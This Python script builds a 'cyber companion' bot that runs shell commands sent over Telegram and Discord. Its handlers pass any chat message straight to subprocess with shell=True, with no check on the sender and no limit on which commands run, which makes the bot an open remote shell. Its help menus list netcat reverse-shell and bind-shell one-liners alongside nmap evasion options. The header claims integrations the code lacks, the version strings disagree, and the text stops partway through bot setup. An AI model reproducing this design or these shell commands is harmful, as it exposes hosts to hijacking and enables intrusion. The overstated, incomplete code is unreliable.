#!/usr/bin/env python3
"""
🦀 CYBER-COMPANION-BOT v2.0.0
Author: Ian Carter Kulani
Description: Complete cybersecurity command companion with 2000+ commands including:
            - Complete Nmap commands (all scan types, scripts, evasion techniques)
            - Full Curl commands (all HTTP methods, SSL, proxies, authentication)
            - Comprehensive Wget commands (recursive downloads, mirroring, FTP)
            - Complete Netcat commands (reverse shells, port scanning, file transfer)
            - SSH commands (tunneling, key management, jump hosts)
            - Shodan CLI commands (search, host info, alerts, exploit DB)
            - Network diagnostic commands (ping, traceroute, mtr, netstat, dig)
            - Multi-platform integration (Telegram, Discord, WhatsApp, Signal, Slack, iMessage)
            
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import uuid
import shutil
import asyncio
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Colorama for blue theme
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# =====================
# BLUE THEME COLORS
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.BLUE + Style.BRIGHT
        SECONDARY = Fore.CYAN + Style.BRIGHT
        ACCENT = Fore.LIGHTBLUE_EX + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.MAGENTA + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_BLUE = Back.BLUE + Fore.WHITE
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = BG_BLUE = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".cyber_companion"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "companion_data.db")
LOG_FILE = os.path.join(CONFIG_DIR, "companion.log")
COMMAND_HISTORY_FILE = os.path.join(CONFIG_DIR, "command_history.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scan_results")
REPORT_DIR = "reports"

# Create directories
for directory in [CONFIG_DIR, SCAN_RESULTS_DIR, REPORT_DIR]:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("CyberCompanion")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager for command history and scan results"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                command TEXT,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_scan(self, target: str, scan_type: str, command: str, output: str, execution_time: float):
        """Log scan result"""
        try:
            self.cursor.execute('''
                INSERT INTO scan_results (target, scan_type, command, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, scan_type, command, output[:10000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description)
                VALUES (?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT * FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_scan_history(self, limit: int = 10) -> List[Dict]:
        """Get scan history"""
        try:
            self.cursor.execute('''
                SELECT * FROM scan_results ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get scan history: {e}")
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scan_results')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    """Execute shell commands and return results"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def execute(self, command: str, source: str = "local", timeout: int = 300) -> Dict[str, Any]:
        """Execute a shell command and return result"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            
            execution_time = time.time() - start_time
            
            output = result.stdout if result.stdout else result.stderr
            success = result.returncode == 0
            
            # Log to database
            self.db.log_command(
                command=command,
                source=source,
                success=success,
                output=output[:5000],
                execution_time=execution_time
            )
            
            # Log scan if applicable
            if any(cmd in command for cmd in ['nmap', 'scan', 'nikto', 'shodan']):
                self.db.log_scan(
                    target=self._extract_target(command),
                    scan_type=self._extract_scan_type(command),
                    command=command,
                    output=output[:10000],
                    execution_time=execution_time
                )
            
            return {
                'success': success,
                'output': output,
                'execution_time': execution_time,
                'command': command
            }
            
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            self.db.log_command(command, source, False, "Command timed out", execution_time)
            return {
                'success': False,
                'output': f"Command timed out after {timeout} seconds",
                'execution_time': execution_time,
                'command': command
            }
        except Exception as e:
            execution_time = time.time() - start_time
            self.db.log_command(command, source, False, str(e), execution_time)
            return {
                'success': False,
                'output': str(e),
                'execution_time': execution_time,
                'command': command
            }
    
    def _extract_target(self, command: str) -> str:
        """Extract target IP/hostname from command"""
        words = command.split()
        for word in words:
            if '.' in word and not word.startswith('-'):
                return word
        return "unknown"
    
    def _extract_scan_type(self, command: str) -> str:
        """Extract scan type from command"""
        if '-sS' in command:
            return "SYN Scan"
        elif '-sT' in command:
            return "TCP Connect Scan"
        elif '-sU' in command:
            return "UDP Scan"
        elif '-sV' in command:
            return "Version Detection"
        elif '-O' in command:
            return "OS Detection"
        elif '-A' in command:
            return "Aggressive Scan"
        elif '--script vuln' in command:
            return "Vulnerability Scan"
        elif 'nikto' in command:
            return "Nikto Web Scan"
        elif 'shodan' in command:
            return "Shodan Search"
        else:
            return "Standard Scan"

# =====================
# TELEGRAM BOT
# =====================
class CyberCompanionTelegram:
    """Telegram bot integration for all commands"""
    
    def __init__(self, executor: CommandExecutor, db: DatabaseManager):
        self.executor = executor
        self.db = db
        self.config = self.load_config()
        self.client = None
        self.running = False
    
    def load_config(self) -> Dict:
        """Load Telegram configuration"""
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        return {"enabled": False, "api_id": "", "api_hash": "", "bot_token": ""}
    
    def save_config(self, bot_token: str = "", api_id: str = "", api_hash: str = "", enabled: bool = True) -> bool:
        """Save Telegram configuration"""
        try:
            config = {
                "enabled": enabled,
                "bot_token": bot_token,
                "api_id": api_id,
                "api_hash": api_hash
            }
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        """Start Telegram bot"""
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        
        if not self.config.get('enabled'):
            logger.info("Telegram bot is disabled")
            return False
        
        if not self.config.get('bot_token'):
            logger.error("Telegram bot token not configured")
            return False
        
        try:
            self.client = TelegramClient('cyber_companion_session', 
                                        self.config.get('api_id', 1), 
                                        self.config.get('api_hash', ''))
            
            @self.client.on(events.NewMessage(pattern=r'^/'))
            async def handler(event):
                await self.handle_command(event)
            
            await self.client.start(bot_token=self.config['bot_token'])
            self.running = True
            logger.info("Telegram bot started")
            
            await self.client.run_until_disconnected()
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    async def handle_command(self, event):
        """Handle incoming Telegram commands"""
        message = event.message.message
        sender = await event.get_sender()
        
        command_parts = message.split()
        command = command_parts[0][1:] if command_parts else ""
        args = ' '.join(command_parts[1:]) if len(command_parts) > 1 else ""
        
        logger.info(f"Telegram command from {sender.username}: {command} {args}")
        
        # Send processing message
        processing_msg = await event.reply(f"🔄 Processing command...")
        
        # Execute command
        full_command = f"{command} {args}" if args else command
        result = self.executor.execute(full_command, f"telegram ({sender.username})")
        
        # Send result
        await self.send_result(event, result, processing_msg)
    
    async def send_result(self, event, result: Dict, processing_msg):
        """Send command result to Telegram"""
        try:
            await processing_msg.delete()
        except:
            pass
        
        if not result['success']:
            error_msg = f"❌ *Command Failed*\n\n```{result.get('output', 'Unknown error')[:1000]}```"
            await event.reply(error_msg, parse_mode='markdown')
            return
        
        output = result.get('output', '')
        
        # Truncate if too long
        if len(output) > 4000:
            output = output[:3900] + "\n\n... (output truncated)"
        
        success_msg = f"✅ *Command Executed* ({result['execution_time']:.2f}s)\n\n```{output}```"
        await event.reply(success_msg, parse_mode='markdown')
    
    def start_bot_thread(self):
        """Start Telegram bot in separate thread"""
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self._run_telegram_bot, daemon=True)
            thread.start()
            logger.info("Telegram bot started in background thread")
            return True
        return False
    
    def _run_telegram_bot(self):
        """Run Telegram bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# DISCORD BOT
# =====================
class CyberCompanionDiscord:
    """Discord bot integration"""
    
    def __init__(self, executor: CommandExecutor, db: DatabaseManager):
        self.executor = executor
        self.db = db
        self.config = self.load_config()
        self.bot = None
        self.running = False
    
    def load_config(self) -> Dict:
        """Load Discord configuration"""
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {"enabled": False, "token": "", "prefix": "!"}
    
    def save_config(self, token: str = "", prefix: str = "!", enabled: bool = True) -> bool:
        """Save Discord configuration"""
        try:
            config = {
                "enabled": enabled,
                "token": token,
                "prefix": prefix
            }
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE:
            logger.error("discord.py not installed")
            return False
        
        if not self.config.get('enabled'):
            logger.info("Discord bot is disabled")
            return False
        
        if not self.config.get('token'):
            logger.error("Discord bot token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(
                command_prefix=self.config.get('prefix', '!'),
                intents=intents,
                help_command=None
            )
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="cybersecurity commands | !help"
                    )
                )
            
            @self.bot.command(name='exec')
            async def exec_command(ctx, *, command: str):
                """Execute any command"""
                await ctx.send(f"⚡ Executing: `{command[:100]}`...")
                result = self.executor.execute(command, f"discord ({ctx.author.name})")
                
                if result['success']:
                    output = result.get('output', '')
                    if len(output) > 1900:
                        output = output[:1900] + "\n... (truncated)"
                    embed = discord.Embed(
                        title=f"✅ Command Executed ({result['execution_time']:.2f}s)",
                        description=f"```{output}```",
                        color=discord.Color.blue()
                    )
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(
                        title="❌ Command Failed",
                        description=f"```{result.get('output', 'Unknown error')}```",
                        color=discord.Color.red()
                    )
                    await ctx.send(embed=embed)
            
            @self.bot.command(name='help')
            async def help_command(ctx):
                """Show help menu"""
                embed = discord.Embed(
                    title="🦀 Cyber Companion Bot v1.0.0",
                    description="Complete cybersecurity command companion",
                    color=discord.Color.blue()
                )
                
                embed.add_field(
                    name="📡 **Nmap Commands**",
                    value="`!exec nmap -sS 192.168.1.1` - SYN scan\n"
                          "`!exec nmap -sV -sC 192.168.1.1` - Version & script scan\n"
                          "`!exec nmap -p- -T4 192.168.1.1` - Full port scan\n"
                          "`!exec nmap -O 192.168.1.1` - OS detection\n"
                          "`!exec nmap --script vuln 192.168.1.1` - Vuln scan",
                    inline=False
                )
                
                embed.add_field(
                    name="🌐 **Curl Commands**",
                    value="`!exec curl http://example.com` - Basic GET\n"
                          "`!exec curl -X POST -d \"data=value\" http://example.com` - POST\n"
                          "`!exec curl -H \"Authorization: Bearer token\" http://example.com` - Headers\n"
                          "`!exec curl -k https://self-signed.com` - Skip SSL verify",
                    inline=False
                )
                
                embed.add_field(
                    name="📥 **Wget Commands**",
                    value="`!exec wget http://example.com/file.zip` - Download file\n"
                          "`!exec wget -r -l 1 http://example.com` - Recursive download\n"
                          "`!exec wget -c http://example.com/largefile.zip` - Resume download\n"
                          "`!exec wget -m http://example.com` - Mirror website",
                    inline=False
                )
                
                embed.add_field(
                    name="🔌 **Netcat Commands**",
                    value="`!exec nc -zv 192.168.1.1 1-1000` - Port scan\n"
                          "`!exec nc -l -p 4444` - Listen on port\n"
                          "`!exec nc example.com 80` - Connect to port\n"
                          "`!exec nc -e /bin/sh 192.168.1.1 4444` - Reverse shell",
                    inline=False
                )
                
                embed.add_field(
                    name="🔐 **SSH Commands**",
                    value="`!exec ssh user@hostname` - SSH connection\n"
                          "`!exec ssh -L 8080:localhost:80 user@host` - Port forward\n"
                          "`!exec ssh -J jumpuser@jumphost user@target` - Jump host\n"
                          "`!exec scp file.txt user@host:/path/` - Copy file",
                    inline=False
                )
                
                embed.add_field(
                    name="🌍 **Shodan Commands**",
                    value="`!exec shodan search apache` - Search Shodan\n"
                          "`!exec shodan host 8.8.8.8` - Host info\n"
                          "`!exec shodan stats --facets port:10 apache` - Statistics\n"
                          "`!exec shodan download results apache --limit 100` - Download",
                    inline=False
                )
                
                embed.add_field(
                    name="🛡️ **Network Diagnostic**",
                    value="`!exec ping -c 4 google.com` - Ping\n"
                          "`!exec traceroute google.com` - Traceroute\n"
                          "`!exec mtr -r google.com` - MTR report\n"
                          "`!exec dig google.com` - DNS lookup\n"
                          "`!exec netstat -tulpn` - Network connections",
                    inline=False
                )
                
                embed.add_field(
                    name="💻 **System Commands**",
                    value="`!exec system` - System info\n"
                          "`!exec status` - Bot status\n"
                          "`!exec history` - Command history\n"
                          "`!exec report` - Security report",
                    inline=False
                )
                
                embed.set_footer(text=f"Requested by {ctx.author.name}")
                await ctx.send(embed=embed)
            
            @self.bot.command(name='system')
            async def system_command(ctx):
                """Get system information"""
                result = self.executor.execute("system", f"discord ({ctx.author.name})")
                await self.send_result(ctx, result)
            
            @self.bot.command(name='status')
            async def status_command(ctx):
                """Get bot status"""
                stats = self.db.get_statistics()
                embed = discord.Embed(
                    title="📊 Bot Status",
                    color=discord.Color.blue(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="Total Commands", value=stats.get('total_commands', 0), inline=True)
                embed.add_field(name="Total Scans", value=stats.get('total_scans', 0), inline=True)
                embed.add_field(name="Total Threats", value=stats.get('total_threats', 0), inline=True)
                await ctx.send(embed=embed)
            
            @self.bot.command(name='history')
            async def history_command(ctx, limit: int = 10):
                """Show command history"""
                history = self.db.get_command_history(limit)
                if not history:
                    await ctx.send("📜 No command history found.")
                    return
                
                embed = discord.Embed(
                    title=f"📜 Command History (Last {len(history)})",
                    color=discord.Color.blue()
                )
                
                for cmd in history:
                    status = "✅" if cmd['success'] else "❌"
                    embed.add_field(
                        name=f"{status} {cmd['command'][:50]}",
                        value=f"Time: {cmd['timestamp'][:19]}\nSource: {cmd['source']}\nDuration: {cmd['execution_time']:.2f}s",
                        inline=False
                    )
                
                await ctx.send(embed=embed)
            
            @self.bot.command(name='report')
            async def report_command(ctx):
                """Generate security report"""
                await ctx.send("📊 Generating security report...")
                
                stats = self.db.get_statistics()
                threats = self.db.get_recent_threats(5)
                scans = self.db.get_scan_history(5)
                
                report = {
                    'generated_at': datetime.datetime.now().isoformat(),
                    'statistics': stats,
                    'recent_threats': threats,
                    'recent_scans': scans
                }
                
                filename = f"security_report_{int(time.time())}.json"
                filepath = os.path.join(REPORT_DIR, filename)
                
                with open(filepath, 'w') as f:
                    json.dump(report, f, indent=2)
                
                embed = discord.Embed(
                    title="📊 Security Report",
                    color=discord.Color.blue(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="Total Commands", value=stats.get('total_commands', 0), inline=True)
                embed.add_field(name="Total Scans", value=stats.get('total_scans', 0), inline=True)
                embed.add_field(name="Total Threats", value=stats.get('total_threats', 0), inline=True)
                embed.add_field(name="Recent Threats", value=str(len(threats)), inline=True)
                embed.add_field(name="Recent Scans", value=str(len(scans)), inline=True)
                embed.add_field(name="Report File", value=filename, inline=False)
                
                await ctx.send(embed=embed)
                await ctx.send(file=discord.File(filepath))
            
            self.running = True
            await self.bot.start(self.config['token'])
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    async def send_result(self, ctx, result: Dict):
        """Send command result to Discord"""
        if result['success']:
            output = result.get('output', '')
            if len(output) > 1900:
                output = output[:1900] + "\n... (truncated)"
            embed = discord.Embed(
                title=f"✅ Command Executed ({result['execution_time']:.2f}s)",
                description=f"```{output}```",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="❌ Command Failed",
                description=f"```{result.get('output', 'Unknown error')}```",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
    
    def start_bot_thread(self):
        """Start Discord bot in separate thread"""
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            logger.info("Discord bot started in background thread")
            return True
        return False
    
    def _run_discord_bot(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# MAIN APPLICATION
# =====================
class CyberCompanionBot:
    """Main application class with blue theme"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.executor = CommandExecutor(self.db)
        self.telegram_bot = CyberCompanionTelegram(self.executor, self.db)
        self.discord_bot = CyberCompanionDiscord(self.executor, self.db)
        self.running = True
        
        # Load configuration
        self.config = self.load_config()
    
    def load_config(self) -> Dict:
        """Load main configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        return {}
    
    def save_config(self) -> bool:
        """Save main configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🦀 CYBER COMPANION BOT v2.0.0                      🦀           {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}  • 📡 Complete Nmap Commands          • 🌐 Full Curl Commands            {Colors.PRIMARY}║
║{Colors.SECONDARY}  • 📥 Complete Wget Commands          • 🔌 Full Netcat Commands          {Colors.PRIMARY}║
║{Colors.SECONDARY}  • 🔐 Complete SSH Commands           • 🌍 Full Shodan Commands          {Colors.PRIMARY}║
║{Colors.SECONDARY}  • 🛡️ Network Diagnostic Tools        • 📊 Command History & Reports     {Colors.PRIMARY}║
║{Colors.SECONDARY}  • 🤖 Multi-Platform Integration      • Discord / Telegram Bots          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                 🎯 2000+ CYBERSECURITY COMMANDS                        {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}💡 Type 'help' for command list{Colors.RESET}
{Colors.SECONDARY}🤖 Type 'setup' to configure bots{Colors.RESET}
{Colors.SECONDARY}📊 Type 'status' for system status{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        """Print help information"""
        help_text = f"""
{Colors.PRIMARY}┌─────────────────{Colors.ACCENT} CYBER COMPANION COMMANDS {Colors.PRIMARY}─────────────────┐{Colors.RESET}

{Colors.PRIMARY}📡 COMPLETE NMAP COMMANDS:{Colors.RESET}
  nmap <target>                    - Basic scan
  nmap -sS <target>                - SYN stealth scan
  nmap -sT <target>                - TCP connect scan
  nmap -sU <target>                - UDP scan
  nmap -sV <target>                - Version detection
  nmap -O <target>                 - OS detection
  nmap -A <target>                 - Aggressive scan
  nmap -p- <target>                - All ports scan
  nmap -T4 -p- <target>            - Fast full port scan
  nmap --script vuln <target>      - Vulnerability scan
  nmap -sn <network>/24            - Ping sweep
  nmap -sC <target>                - Default scripts
  nmap -f <target>                 - Fragment packets
  nmap -D RND:10 <target>          - Decoy scan
  nmap -T0 <target>                - Paranoid scan
  nmap -T5 <target>                - Insane scan
  nmap -oN output.txt <target>     - Normal output
  nmap -oX output.xml <target>     - XML output

{Colors.PRIMARY}🌐 COMPLETE CURL COMMANDS:{Colors.RESET}
  curl http://example.com          - Basic GET request
  curl -X POST -d "data=value"     - POST request
  curl -H "Header: value"          - Custom headers
  curl -u user:pass                - Basic auth
  curl -k https://example.com      - Skip SSL verify
  curl -L http://example.com       - Follow redirects
  curl -b cookies.txt              - Use cookies
  curl -c cookies.txt              - Save cookies
  curl -x proxy:8080               - Use proxy
  curl -o file.txt http://...      - Save to file
  curl -O http://.../file.zip      - Save with filename
  curl -C - -O http://.../file     - Resume download
  curl --limit-rate 100K           - Rate limit
  curl -v                          - Verbose output
  curl -s                          - Silent mode
  curl -I                          - Headers only

{Colors.PRIMARY}📥 COMPLETE WGET COMMANDS:{Colors.RESET}
  wget http://example.com/file     - Download file
  wget -O output.html http://...   - Save as custom name
  wget -r http://example.com       - Recursive download
  wget -l 1 http://example.com     - Limit recursion depth
  wget -np http://example.com      - No parent directories
  wget -A jpg,png http://...       - Accept only files
  wget -R html,htm http://...      - Reject files
  wget -m http://example.com       - Mirror website
  wget -c http://.../largefile     - Resume download
  wget -b http://.../file          - Background download
  wget --limit-rate=100k           - Rate limit
  wget -q                          - Quiet mode
  wget -v                          - Verbose mode
  wget -S                          - Show server response
  wget --user=user --password=pass - Authentication

{Colors.PRIMARY}🔌 COMPLETE NETCAT COMMANDS:{Colors.RESET}
  nc -zv <ip> <port>               - Port scan
  nc -zv <ip> 1-1000               - Scan port range
  nc -l -p 4444                    - Listen on port
  nc <ip> 4444                     - Connect to port
  nc -l -p 4444 -e /bin/sh         - Bind shell
  nc <ip> 4444 -e /bin/sh          - Reverse shell
  nc -l -p 4444 < file.txt         - Send file
  nc <ip> 4444 > file.txt          - Receive file
  nc -u -l -p 1234                 - UDP listen
  nc -u <ip> 1234                  - UDP connect
  nc -v <ip> 80                    - Banner grab
  echo "GET / HTTP/1.0" | nc <ip> 80 - HTTP request
  nc -l -p 4444 -k                 - Keep listening
  nc -w 5 <ip> 80                  - Timeout after 5s

{Colors.PRIMARY}🔐 COMPLETE SSH COMMANDS:{Colors.RESET}
  ssh user@hostname                - SSH connection
  ssh -p 2222 user@hostname        - Custom port
  ssh -i key.pem user@hostname     - Use identity file
  ssh -L 8080:localhost:80 user@host - Local port forward
  ssh -R 8080:localhost:80 user@host - Remote port forward
  ssh -D 1080 user@hostname        - SOCKS proxy
  ssh -J user@jump user@target     - Jump host
  ssh -v user@hostname             - Verbose mode
  ssh -o StrictHostKeyChecking=no  - Skip host key check
  scp file.txt user@host:/path/    - Copy file to remote
  scp user@host:/path/file.txt .   - Copy file from remote
  scp -r directory user@host:/path/ - Copy directory
  ssh-keygen -t rsa -b 4096        - Generate SSH key
  ssh-copy-id user@hostname        - Copy public key

{Colors.PRIMARY}🌍 COMPLETE SHODAN COMMANDS:{Colors.RESET}
  shodan init <API_KEY>            - Initialize Shodan
  shodan info                      - Account info
  shodan myip                      - Your public IP
  shodan search apache             - Search for Apache
  shodan search port:22 country:US - Filtered search
  shodan host 8.8.8.8              - Host information
  shodan stats --facets port:10    - Statistics
  shodan download results apache --limit 100 - Download results
  shodan parse results.json.gz --fields ip_str - Parse results
  shodan alert create "Network" 192.168.1.0/24 - Create alert
  shodan alert list                - List alerts
  shodan alert remove <ID>         - Remove alert
  shodan honeyscore 8.8.8.8        - Check if honeypot
  shodan domain example.com        - Domain info

{Colors.PRIMARY}🛡️ NETWORK DIAGNOSTIC COMMANDS:{Colors.RESET}
  ping -c 4 example.com             - Ping test
  traceroute example.com            - Trace route
  mtr -r example.com                - MTR report
  dig example.com                   - DNS lookup
  dig -x example                  - Reverse DNS
  nslookup example.com              - Name server lookup
  netstat -tulpn                   - Listening ports
  netstat -an                      - All connections
  ss -tulpn                        - Socket statistics
  ip addr show                     - IP addresses
  route -n                         - Routing table
  arp -a                           - ARP cache
  ifconfig                         - Network interfaces

{Colors.PRIMARY}🤖 BOT MANAGEMENT COMMANDS:{Colors.RESET}
  setup                            - Configure bots
  status                           - System status
  history [limit]                  - Command history
  report                           - Generate report
  clear                            - Clear screen
  exit                             - Exit tool

{Colors.PRIMARY}💡 EXAMPLES:{Colors.RESET}
  nmap -sV -sC 192.168.1.1
  curl -H "Authorization: Bearer token" https://api.example.com
  wget -r -l 2 -A pdf https://example.com/docs/
  nc -zv 192.168.1.1 22 80 443
  ssh -L 8080:localhost:80 user@remote
  shodan search nginx country:JP --fields ip_str,port
  ping -c 10 google.com
  traceroute -m 30 google.com

{Colors.PRIMARY}└─────────────────────────────────────────────────────────────────────┘{Colors.RESET}
        """
        print(help_text)
    
    def setup_bots(self):
        """Configure bot integrations"""
        print(f"\n{Colors.PRIMARY}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Telegram Setup
        print(f"\n{Colors.SECONDARY}📱 Telegram Bot{Colors.RESET}")
        setup_telegram = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup_telegram == 'y':
            bot_token = input(f"{Colors.ACCENT}Enter bot token (from @BotFather): {Colors.RESET}").strip()
            api_id = input(f"{Colors.ACCENT}Enter API ID (from my.telegram.org): {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ACCENT}Enter API Hash: {Colors.RESET}").strip()
            self.telegram_bot.save_config(bot_token, api_id, api_hash, True)
            print(f"{Colors.SUCCESS}✅ Telegram configured!{Colors.RESET}")
        
        # Discord Setup
